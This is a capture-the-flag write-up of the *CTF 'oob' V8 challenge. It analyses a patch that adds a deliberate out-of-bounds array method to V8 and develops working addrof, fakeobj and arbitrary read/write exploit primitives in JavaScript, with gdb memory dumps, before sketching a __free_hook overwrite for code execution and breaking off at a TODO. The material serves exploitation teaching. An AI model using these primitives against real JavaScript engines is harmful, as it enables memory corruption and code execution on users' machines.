---
description: The actual challenge
---

# The Challenge

## The Patch

Let's first read the patch itself:

```git
diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc
index b027d36..ef1002f 100644
--- a/src/bootstrapper.cc
+++ b/src/bootstrapper.cc
@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
                           Builtins::kArrayPrototypeCopyWithin, 2, false);
     SimpleInstallFunction(isolate_, proto, "fill",
                           Builtins::kArrayPrototypeFill, 1, false);
+    SimpleInstallFunction(isolate_, proto, "oob",
+                          Builtins::kArrayOob,2,false);
     SimpleInstallFunction(isolate_, proto, "find",
                           Builtins::kArrayPrototypeFind, 1, false);
     SimpleInstallFunction(isolate_, proto, "findIndex",
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index 8df340e..9b828ab 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
   return *final_length;
 }
 }  // namespace
+BUILTIN(ArrayOob){
+    uint32_t len = args.length();
+    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
+    Handle<JSReceiver> receiver;
+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+            isolate, receiver, Object::ToObject(isolate, args.receiver()));
+    Handle<JSArray> array = Handle<JSArray>::cast(receiver);
+    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
+    uint32_t length = static_cast<uint32_t>(array->length()->Number());
+    if(len == 1){
+        //read
+        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
+    }else{
+        //write
+        Handle<Object> value;
+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+                isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));
+        elements.set(length,value->Number());
+        return ReadOnlyRoots(isolate).undefined_value();
+    }
+}
 
 BUILTIN(ArrayPush) {
   HandleScope scope(isolate);
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 0447230..f113a81 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -368,6 +368,7 @@ namespace internal {
   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
+  CPP(ArrayOob)                                                                \
                                                                                \
   /* ArrayBuffer */                                                            \
   /* ES #sec-arraybuffer-constructor */                                        \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index ed1e4a5..c199e3a 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
     case Builtins::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
+    case Builtins::kArrayOob:
+      return Type::Receiver();
 
     // ArrayBuffer functions.
     case Builtins::kArrayBufferIsView:
```

In essence, there is a new function `ArrayOob` that is implemented. We can see it's added to the array object as a `.oob()` method:

```git
+    SimpleInstallFunction(isolate_, proto, "oob",
+                          Builtins::kArrayOob,2,false);
```

There's the odd bit of other stuff thrown around for getting it working, but the actual source of the challenge is (unsurprisingly) `ArrayOob` itself (with a name like that, who would have thought?). Cleaned up a little, it looks like this:

```cpp
BUILTIN(ArrayOob){
    uint32_t len = args.length();
    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
    
    Handle<JSReceiver> receiver;
    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
        isolate, receiver, Object::ToObject(isolate, args.receiver())
    );
    
    Handle<JSArray> array = Handle<JSArray>::cast(receiver);
    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
    uint32_t length = static_cast<uint32_t>(array->length()->Number());
    
    if(len == 1) {
        //read
        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
    } else {
        //write
        Handle<Object> value;
        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
            isolate, value, Object::ToNumber(isolate, args.at<Object>(1))
        );
        elements.set(length,value->Number());
        return ReadOnlyRoots(isolate).undefined_value();
    }
}
```

Familiarity with the V8 codebase is unlikely, and even if you _are_ familiar with it, it's unlikely you can read it like a native language.

* It looks at the number of arguments the function takes, then stores it in `len`
  * If `len` is greater than `2`, it throws an error (note that the first argument is always `this`, so in reality it's just one).
* It then gets the array in question, stored in `array`
* `array` is cast to a `FixedDoubleArray`, an array of fixed size that stores doubles, called `elements`
  * The length of the array is stored in `length`
* If there is no argument (`len == 1`, i.e. only `this` is passed) then `elements[length]` is returned
  * This is a clear **Out-Of-Bounds (OOB) Read**, as arrays in javascript are zero-indexed like most other programming languages
* If an argument is given, `elements[length]` is set to the `value` that is the argument cast to a Number with `Object::ToNumber`
  * This is a clear **Out-Of-Bounds (OOB) Write**, for the same reason as above

So we have a very clear OOB vulnerability, allowing both a read and a write to one index further than the maximum length of the array. This begs an important question: what exists past the end of an array?

First, let's talk about data types in V8 and how they are represented.

## Values and their Types

V8 uses **pointers**, **doubles** and **smis** (standing for **immediate small integers**). Since it has to distinguish between these values, they are all stored in memory with slight differences.

* A **double** is stored as its 64-bit binary representation (easy)
* An **smi** is a 32-bit number, but it's stored as itself left-shifted by `32` so the bottom 32 bits are null
  * &#x20;e.g. `0x12345678` is stored as `0x1234567800000000`
* A **pointer** to an address `addr` is stored as `addr | 1`, that is the least significant bit is set to `1`.
  * e.g. `0x12345678` is stored as `0x12345679`
  * This helps differentiate it from an **smi**, but not from a **double**!

[Saelo's paper](http://www.phrack.org/issues/70/9.html) refers to **pointers** as **HeapObjects** as well.

### Integers in V8

Any output you get will always be in floating-point form; this is because V8 actually _doesn't have a way to express 64-bit integers normally_. We need a way to convert floating-point outputs to hexadecimal addresses (and vice versa!). To do this, we'll use the standard approach, which is as follows:

```javascript
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}
```

You'll see these functions in most V8 exploits. They essentially just convert between interpreting data as floating-point form or as integers.

We're going to throw this into a javascript file `exploit.js`. If we want to use these functions, we can simply pass them to d8 in the command line:

```bash
./d8 --shell ./exploit.js
```

## Maps

The Map is an incredibly important V8 data structure, storing key information such as

* The dynamic type of the object (e.g. String, Uint8Array, etc)
* The size of the object in bytes
* The properties of the object and where they are stored
* The type of the array elements (e.g. unboxed doubles, tagged pointers, etc)

Each javascript object is linked to a map. While the property names are usually stored in the map, the values are stored with the object itself. This allows objects with the same sort of **structure** to **share maps**, increasing efficiency.

There are three different regions that property values can be stored

* Inside the object itself (**inline** properties)
* In a separate dynamically-sized heap buffer (**out-of-line** properties)
* If the property name is an integer index, then as array elements in a dynamically-sized heap array
  * to be honest, not entirely sure that this means, but I'll get it eventually

In the first two cases, the Map stores each property of the object with a linked **slot number**. Each object then contains all of the property values, matching with the slot number of the relevant property. The object does not store the name of the property, only the slot number.

I promise this makes sense - for example, let's take two array objects:

<pre class="language-javascript"><code class="lang-javascript"><strong>var object1 = {a: 20, b: 40};
</strong>var object2 = {a: 30, b: 60};
</code></pre>

Once this is run, memory will contain **two** `JSObject` instances and **one** `Map`:

<figure><img src="../../../.gitbook/assets/v8_map_object (2).svg" alt=""><figcaption></figcaption></figure>

We can see that the `Map` stores the properties `a` and `b`, giving them the slot values `0` and `1` respectively. The two objects `object1` and `object2`, because of their identical structure, both use `Map1` as a map. The objects do not themselves know the name of the properties, only the slot values, which they assign a value to.

However, if we add another property - say `c`, with value `60` - to `object1`, they stop sharing the map:

<figure><img src="../../../.gitbook/assets/v8_map_object_diff_map (3).svg" alt=""><figcaption></figcaption></figure>

If we then added a property `c` to `object2`, they would then share `Map1` again! This works assigning each map something called a _transition table_, which is just a note of which map to transition to if a property of a certain name (and possibly type) are added to it. In the example above, `Map2` would make a note that if a property `c` is added to `object2` then it should transition to use `Map1`.

Let's see how this works out in memory for arrays using the `debug` version of d8, along with the incredibly helpful `%DebugPrint()` feature that comes along with it. We'll run it under `gdb` so we can analyse memory as well, and make connections between all the parts.

## What exists after the end of an Array?

Instead of creating our own objects, let's focus specifically on how it works for arrays, as that is what we are dealing with here.

```javascript
$ gdb d8 
gef➤  run --allow-natives-syntax
V8 version 7.5.0 (candidate)
d8> a = [1.5, 2.5]
[1.5, 2.5]
d8> %DebugPrint(a)
DebugPrint: 0x30b708b4dd71: [JSArray]
 - map: 0x09bccc0c2ed9 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x2358a3991111 <JSArray[0]>
 - elements: 0x30b708b4dd51 <FixedDoubleArray[2]> [PACKED_DOUBLE_ELEMENTS]
 - length: 2
 - properties: 0x3659bdb00c71 <FixedArray[0]> {
    #length: 0x0418bc0c01a9 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x30b708b4dd51 <FixedDoubleArray[2]> {
           0: 1.5
           1: 2.5
 }
0x9bccc0c2ed9: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 32
 - inobject properties: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x09bccc0c2e89 <Map(HOLEY_SMI_ELEMENTS)>
 - prototype_validity cell: 0x0418bc0c0609 <Cell value= 1>
 - instance descriptors #1: 0x2358a3991f49 <DescriptorArray[1]>
 - layout descriptor: (nil)
 - transitions #1: 0x2358a3991eb9 <TransitionArray[4]>Transition array #1:
     0x3659bdb04ba1 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x09bccc0c2f29 <Map(HOLEY_DOUBLE_ELEMENTS)>

 - prototype: 0x2358a3991111 <JSArray[0]>
 - constructor: 0x2358a3990ec1 <JSFunction Array (sfi = 0x418bc0caca1)>
 - dependent code: 0x3659bdb002c1 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

[1.5, 2.5]
d8>

```

That is a lot of information. Let's sift through the relevant parts.

Firstly, we notice that `a` is a type `JSArray`, stored in memory at `0x30b708b4dd70`. The array's map is stored at `0x09bccc0c2ed8`, with the properties (in this case `length`) stored at `0x3659bdb00c70`. The `elements` themselves are in a `FixedDoubleArray` stored at `0x30b708b4dd50`.

{% hint style="info" %}
Remember pointer tagging! All the addresses are represented as `addr | 1`, so we have to subtract off `1` for every pointer to get the real location!
{% endhint %}

Let's view memory itself. Hit `Ctrl-C` and you'll go to the `gef` prompt. Let's view the memory at the location of the `JSArray` object itself, `0x30b708b4dd70`.

```javascript
gef➤  x/4gx 0x30b708b4dd70
0x30b708b4dd70:	0x000009bccc0c2ed9	0x00003659bdb00c71
0x30b708b4dd80:	0x000030b708b4dd51	0x0000000200000000
```

So the `JSArray` first has its pointer to its own map, then a pointer to its properties, then a pointer to its elements and then its length (note that `length` will be an **smi**, so a length of `2` is actually represented in memory as `2<<32`!).

One thing that is very curious is that the the `elements` array is actually located `0x20` bytes ahead of memory from the `JSArray` object itself. Interesting! Let's view it:

```javascript
gef➤  x/10gx 0x000030b708b4dd50
0x30b708b4dd50:	0x00003659bdb014f9	0x0000000200000000  <- elements (map, length)
0x30b708b4dd60:	0x3ff8000000000000	0x4004000000000000  <- array entries
0x30b708b4dd70:	0x000009bccc0c2ed9	0x00003659bdb00c71  <- JSArray
0x30b708b4dd80:	0x000030b708b4dd51	0x0000000200000000
0x30b708b4dd90:	0x00003659bdb01cc9	0x0000000400000000
```

Note that `elements` itself is a `FixedDoubleArray`, so the first value will be a pointer to its map at `0x00003659bdb014f8`; this map doesn't concern us right now. The next value is the length of the `FixedDoubleArray`, the **smi** of `0x2` again. After this, it gets interesting.

As expected, the next two entries are the **doubles** representing `1.5` and `2.5`, the entries in the array:

```javascript
gef➤  p/f 0x3ff8000000000000
$1 = 1.5
gef➤  p/f 0x4004000000000000
$2 = 2.5
```

But immediately after in memory is the original `JSArray`. So? Well, if we have an OOB read/write to an extra index past the array,  the value we are accessing is the **pointer in the `JSArray` that points to the map**. We can write to and read the map of the array.

Just to confirm this is correct, we're going to run the **release** version of d8 and check the output of `.oob()`. The reason we have to use release is that the **debug** version has a lot more safety and OOB checks (I assume for fuzzing purposes) so will just break if we try to use `a.oob()`. We need to run it with `--file exploit.js`, and you'll see why in a second.

```javascript
$ gdb d8 
gef➤  run --allow-natives-syntax --shell exploit.js
V8 version 7.5.0 (candidate)
d8> a = [1.5, 2.5]
[1.5, 2.5]
d8> a.oob()
2.28382032514e-310
```

Now we need to use our `ftoi()` function to convert it to a hexadecimal integer:

```javascript
d8> ftoi(a.oob()).toString(16)
"2a0a9af82ed9"
```

If our reasoning is correct, this is a pointer to the map, which is located at `0x2a0a9af82ed9`. Let's compare with GDB tells us:

```javascript
d8> %DebugPrint(a)
0x2d83ee78e0b9 <JSArray[2]>
[1.5, 2.5]
d8> ^C
gef➤  x/4gx 0x2d83ee78e0b8
0x2d83ee78e0b8:	0x00002a0a9af82ed9	0x00000db811140c71
0x2d83ee78e0c8:	0x00002d83ee78e099	0x0000000200000000
```

The first value at the location of the `JSArray` is, as we saw earlier, the pointer to the map. Not only that, but we successfully read it! Look - it's `0x2a0a9af82ed9` again!

Now we know we can read and write to the map that the array uses. How do we go from here?

## Abusing Map Control

### Values vs Pointers

The important thing to note is that sometimes a program will store values (pass by value), and sometimes it will store a pointer to a value (pass by reference). We can abuse this functionality, because an array of doubles will store the double values themselves while an array of objects will store **pointers to the objects**.

This means there is an extra link in the chain - if we do `array[2]` on an array of doubles, V8 will go to the address in memory, read the value there, and return it. If we do `array[2]` on an array of objects, V8 will go to the address in memory, read the value there, go to **that** address in memory, and return **that** value.

We can see this behaviour by defining two arrays, one of doubles and one of custom objects:

```javascript
var float_arr = [1.5, 2.5]
var obj1 = {a: 1, b: 2}
var obj2 = {a: 5, b: 10}
var obj_arr = [obj1, obj2]
```

```javascript
gef➤  run --allow-natives-syntax --shell exploit.js
V8 version 7.5.0 (candidate)
d8> var float_arr = [1.5, 2.5] 
undefined
d8> var obj1 = {a: 1, b: 2}
undefined
d8> var obj2 = {a: 5, b: 10}
undefined
d8> var obj_arr = [obj1, obj2]
undefined
d8> %DebugPrint(float_arr)
0x3a38af88e0c9 <JSArray[2]>
[1.5, 2.5]
d8> %DebugPrint(obj_arr)
0x3a38af8915f1 <JSArray[2]>
[{a: 1, b: 2}, {a: 5, b: 10}]
```

Break out to `gef` and see the `elements` of both arrays.

`float_arr`:

```javascript
gef➤  x/4gx 0x3a38af88e0c8
0x3a38af88e0c8:	0x0000179681882ed9	0x0000389170c80c71
0x3a38af88e0d8:	0x00003a38af88e0a9	0x0000000200000000
gef➤  x/4gx 0x00003a38af88e0a8    <-- access elements array
0x3a38af88e0a8:	0x0000389170c814f9	0x0000000200000000
0x3a38af88e0b8:	0x3ff8000000000000	0x4004000000000000
```

Again, `1.5` and `2.5` in floating-point form.

`obj_arr`:

```javascript
gef➤  x/4gx 0x3a38af8915f0
0x3a38af8915f0:	0x0000179681882f79	0x0000389170c80c71
0x3a38af891600:	0x00003a38af8915d1	0x0000000200000000
gef➤  x/4gx 0x00003a38af8915d0    <-- access elements array
0x3a38af8915d0:	0x0000389170c80801	0x0000000200000000
0x3a38af8915e0:	0x00003a38af8904f1	0x00003a38af8906b1
```

Note that the `elements` array in the second case has values `0x3a38af8904f1` and `0x3a38af8906b1`. If our suspicions are correct, they would be pointers to the objects `obj1` and `obj2`. Do `c` to continue the d8 instance, and print out the debug for the objects:

```javascript
d8> %DebugPrint(obj1)
0x3a38af8904f1 <Object map = 0x17968188ab89>
{a: 1, b: 2}
d8> %DebugPrint(obj2)
0x3a38af8906b1 <Object map = 0x17968188ab89>
{a: 5, b: 10}
```

And look - so beautifully aligned!

### Leaking Object Addresses

What  happens if we overwrite the map of an object array with the map of a float array? Logic dictates that it would **treat it as a double rather than a pointer**, resulting in a leak of the location of `obj1`! Let's try it.

```javascript
d8> var map_float = float_arr.oob()
d8> obj_arr.oob(map_float)
d8> ftoi(obj_arr[0]).toString(16)
"3a38af8904f1"
```

We leak `0x3a38af8904f1` - which is indeed the location of `obj1`! We therefore can leak the location of objects. We call this an `addrof` primitive, and we can add another function to our `exploit.js` to simplify it:

```javascript
var float_arr = [1.5, 2.5];
var map_float = float_arr.oob();

var initial_obj = {a:1};	// placeholder object
var obj_arr = [initial_obj];
var map_obj = obj_arr.oob();

function addrof(obj) {
    obj_arr[0] = obj;			// put desired obj for address leak into index 0
    obj_arr.oob(map_float);		// change to float map
    let leak = obj_arr[0];		// read address
    obj_arr.oob(map_obj);		// change back to object map, to prevent issues down the line
    return ftoi(leak);			// return leak as an integer
}
```

We can load it up in d8 ourselves and compare the results:

```javascript
$ gdb d8 
gef➤  run --allow-natives-syntax --shell exploit.js
V8 version 7.5.0 (candidate)
d8> obj = {a:1}
{a: 1}
d8> %DebugPrint(obj)
0x031afef4ebe9 <Object map = 0x3658c164ab39>
{a: 1}
d8> addrof(obj).toString(16)
"31afef4ebe9"
```

Perfect, it corresponds exactly!

### Creating Fake Objects

The opposite of the `addrof` primitive is called a `fakeobj` primitive, and it works in the exact opposite way - we place a memory address at an index in the **float** array, and then change the map to that of the **object** array.

```javascript
function fakeobj(addr) {
    float_arr[0] = itof(addr);  // placed desired address into index 0
    float_arr.oob(map_obj);     // change to object map
    let fake = float_arr[0];    // get fake object
    float_arr.oob(map_float);   // swap map back
    return fake;                // return object
}
```

### Arbitrary Reads

From here, an arbitrary read is relatively simple. It's important to remember that whatever `fakeobj()` returns is an **object**, not a read! So if the data there does not form a valid object, it's useless.

The trick here is to create a float array, and then make the first index a pointer to a **map** for the float array. We are essentially **faking** an array object inside the actual array. Once we call `fakeobj()` here, we have a valid, faked array.

But why does this help? Remember that the third memory address in a `JSArray` object is an `elements` pointer, which is a pointer to the list of values actually being stored. We can modify the `elements` pointer by accessing index `2` of the real array, faking the `elements` pointer to point to a location of our choice. Accessing index `0` of the fake array will then read from the fake pointer!

\[TODO image, but not sure what exactly would help]

Because we need an index `2`, we're going to make the array of size 4, as 16-byte alignment is _typically_ nice and reduces the probability of things randomly breaking.

```javascript
// array for access to arbitrary memory addresses
var arb_rw_arr = [map_float, 1.5, 2.5, 3.5];
console.log("[+] Address of Arbitrary RW Array: 0x" + addrof(arb_rw_arr).toString(16));
```

Now we want to start an `arb_read()` function. We can begin by tagging the pointer, and then placing a `fakeobj` at the address of the `arb_rw_arr`:

```javascript
function arb_read(addr) {
    // tag pointer
    if (addr % 2n == 0)
        addr += 1n;

    // place a fake object over the elements FixedDoubleArray of the valid array
    let fake = fakeobj(addrof(arb_rw_arr));
}
```

HOWEVER - this is not quite right! We want `fake` to point at the first element of the `FixedDoubleArray` `elements`, so we need an offset of 0x20 bytes back (doubles are 8 bytes of space each, and we know from before that `elements` is just ahead of the `JSArray` itself in memory), so it looks like this:

```javascript
function arb_read(addr) {
    // tag pointer
    if (addr % 2n == 0)
        addr += 1n;

    // place a fake object over the elements FixedDoubleArray of the valid array
    // we know the elements array is placed just ahead in memory, so with a length
    // of 4 it's an offset of 4 * 0x8 = 0x20 
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
}
```

Now we want to access `arb_rw_arr[2]` to overwrite the fake `elements` pointer in the fake array. We want to set this to the desired RW address `addr`, but again we need an offset! This time it's 0x10 bytes, because the first index is 0x10 bytes from the start of the object as the first 8 bytes are a map and the second 8 are the `length` smi:

```javascript
// overwrite `elements` field of fake array with address
// we must subtract 0x10 as there are two 64-bit values
// initially with the map and a size smi, so 0x10 offset
arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
```

And finally we return the leak. Putting it all together:

```javascript
// array for access to arbitrary memory addresses
var arb_rw_arr = [map_float, 1.5, 2.5, 3.5];
console.log("[+] Address of Arbitrary RW Array: 0x" + addrof(arb_rw_arr).toString(16));

function arb_read(addr) {
    // tag pointer
    if (addr % 2n == 0)
        addr += 1n;

    // place a fake object over the elements FixedDoubleArray of the valid array
    // we know the elements array is placed just ahead in memory, so with a length
    // of 4 it's an offset of 4 * 0x8 = 0x20 
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);

    // overwrite `elements` field of fake array with address
    // we must subtract 0x10 as there are two 64-bit values
    // initially with the map and a size smi, so 0x10 offset
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);

    // index 0 will returns the arbitrary read value
    return ftoi(fake[0]);
}
```

### Arbitrary Writes

#### Initial Fail

Logic would dictate that we could equally get an arbitrary write using the same principle, by simply setting the value instead of returning it. Unfortunately, not quite - if we look at [Faith's original writeup](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/#getting-arbitrary-read--write), the `initial_arb_write()` function fails:

```javascript
function initial_arb_write(addr, val) {
    // place a fake object and change elements, as before
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);

    // Write to index 0
    fake[0] = itof(BigInt(val));
}
```

{% hint style="info" %}
Note that we're not explicitly accounting for pointer tagging here. This is not because it's not important, but because the way we've set up `addrof` and `fakeobj` preserves the tagging, and since we're working with static offsets of multiples of `0x10` the tag is preserved. If we tried to **explicitly** write to a location, we would have to tag it. If we wanted to be very thorough, we would put pointer tagging explicitly in all functions.
{% endhint %}

In the blog post they tell us they're not sure why, and goes on to explain the intended method with `ArrayBuffer` backing pointers. In [a short twitter conversation we had](https://twitter.com/farazsth98/status/1737770124952940800) they tell us that

> The arbitrary write doesn't work with certain addresses due to the use of floats. The overwrite had precision loss with certain addresses, but this wasn't the case with ArrayBuffer backing pointers. The code handles that differently compared to the elements ptr.

I can confirm that running the `initial_arb_write()` does, in fact, crash with a SIGSEGV. If anybody finds a fix, I'm sure they would be very interested (and I would too).

#### ArrayBuffer Backing Pointers

An `ArrayBuffer` is simply [used to represent a generic raw binary data buffer](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global\_Objects/ArrayBuffer). We combine this with the `DataView` object to [provide a low-level interface for reading and writing multiple number types](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global\_Objects/DataView). These number types includes the ever-useful `setInt64()`, which is where our reliability for handling the integers probably comes from.

The backing store of an `ArrayBuffer` is much like the `elements` of a `JSArray`, in that it points to the address of the object that actually stores the information. It's placed 0x20 bytes ahead of the `ArrayBuffer` in memory (which you can check with GDB).

We will have to use the `initial_arb_write()` to perform this singular write, and hope that the address precision is good enough (if not, we just run it again).

```javascript
function arb_write(addr, val) {
    // set yp ArrayBuffer and DataView objects
    let buf = new ArrayBuffer(8);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x20n;

    // write to address to backing store
    initial_arb_write(backing_store_addr, addr);
    // write data to offset 0, with little endian true
    dataview.setBigUint64(0, BigInt(val), true);
}
```

## Getting RCE

From here, it's similar to userland exploitation.

### Overwriting \_\_free\_hook() with system()

The simplest approach, as any call to `console.log()` will inevitably be freed immediately after. To do this, we'll need a libc leak.

In order for it to be reliable, it'll have to be through a section of memory allocated by V8 itself. We can use GDB to comb throught the memory of the area that stored the maps. I'll get it to print the address of the original float map:

```javascript
$ gdb ./d8
gef➤  run --allow-natives-syntax --shell exploit.js
[+] Float Map: 0x4aeed2c2ed9
[+] Address of Arbitrary RW Array: 0x13742340f4a1
V8 version 7.5.0 (candidate)
d8> 
```

Breaking into GDB and running `vmmap`, we see a lot of pages, but we are especially interested in the page containing the float map, binary base and the heap.

TODO
